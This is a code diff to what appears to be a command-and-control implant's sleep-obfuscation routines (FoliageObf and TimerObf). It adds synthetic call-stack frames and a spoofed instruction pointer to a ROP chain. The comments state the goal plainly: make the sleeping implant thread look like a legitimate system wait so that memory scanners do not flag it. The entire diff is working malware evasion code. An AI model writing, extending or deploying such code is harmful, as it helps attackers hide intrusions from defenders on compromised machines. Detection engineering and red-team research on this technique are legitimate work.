@@ -272,7 +272,24 @@ VOID FoliageObf(
                     {
                         RopSpoof->ContextFlags = CONTEXT_FULL;
                         RopSpoof->Rip = U_PTR( Instance->Win32.WaitForSingleObjectEx );
-                        RopSpoof->Rsp = U_PTR( Instance->Teb->NtTib.StackBase ); // TODO: try to spoof the stack and remove the pointers
+
+#if _WIN64
+                        /* Synthetic call stack: write fake thread-pool frames
+                         * to the stack instead of just pointing RSP at StackBase.
+                         * This makes the sleeping thread's call stack look like a
+                         * legitimate worker thread blocked in NtWaitForSingleObject. */
+                        if ( Instance->Session.SynthStack.Initialized )
+                        {
+                            RopSpoof->Rsp = SynthStackWrite(
+                                &Instance->Session.SynthStack,
+                                U_PTR( Instance->Teb->NtTib.StackBase )
+                            );
+                        }
+                        else
+#endif
+                        {
+                            RopSpoof->Rsp = U_PTR( Instance->Teb->NtTib.StackBase );
+                        }
 
                         // Execute every registered Apc thread
                         SysNtSignalAndWaitForSingleObject( hEvent, hThread, FALSE, NULL );
@@ -413,6 +430,9 @@ BOOL TimerObf(
     BYTE     JmpBypass = { 0 };
     PVOID    JmpGadget = { 0 };
     BYTE     JmpPad[]  = { 0xFF, 0xE0 };
+#if _WIN64
+    ULONG_PTR SpoofRip = { 0 }; /* synthetic RIP for stack spoof — hides our real instruction pointer */
+#endif
 
     ImageBase = TxtBase = Instance->Session.ModuleBase;
     ImageSize = TxtSize = Instance->Session.ModuleSize;
@@ -551,11 +571,26 @@ BOOL TimerObf(
                         Rop[ Inc ].Rdx = U_PTR( &ThdCtx );
                         Inc++;
 
+#if _WIN64
+                        /* Synthetic RIP: instead of leaking our real instruction pointer
+                         * into the spoofed context (which scanners would flag as unbacked
+                         * memory), set RIP to NtWaitForSingleObject. This makes the thread
+                         * appear to be legitimately blocked in a system wait call.
+                         * The real context (ThdCtx) is still saved and restored after sleep. */
+                        SpoofRip = U_PTR( Instance->Win32.NtWaitForSingleObject );
+
+                        OBF_JMP( Inc, Instance->Win32.RtlCopyMappedMemory )
+                        Rop[ Inc ].Rcx = U_PTR( &TimerCtx.Rip );
+                        Rop[ Inc ].Rdx = U_PTR( &SpoofRip );
+                        Rop[ Inc ].R8  = U_PTR( sizeof( ULONG_PTR ) );
+                        Inc++;
+#else
                         OBF_JMP( Inc, Instance->Win32.RtlCopyMappedMemory )
                         Rop[ Inc ].Rcx = U_PTR( &TimerCtx.Rip );
                         Rop[ Inc ].Rdx = U_PTR( &ThdCtx.Rip );
                         Rop[ Inc ].R8  = U_PTR( sizeof( VOID ) );
                         Inc++;
+#endif
 
                         OBF_JMP( Inc, Instance->Win32.RtlCopyMappedMemory )
                         Rop[ Inc ].Rcx = U_PTR( &Instance->Teb->NtTib );
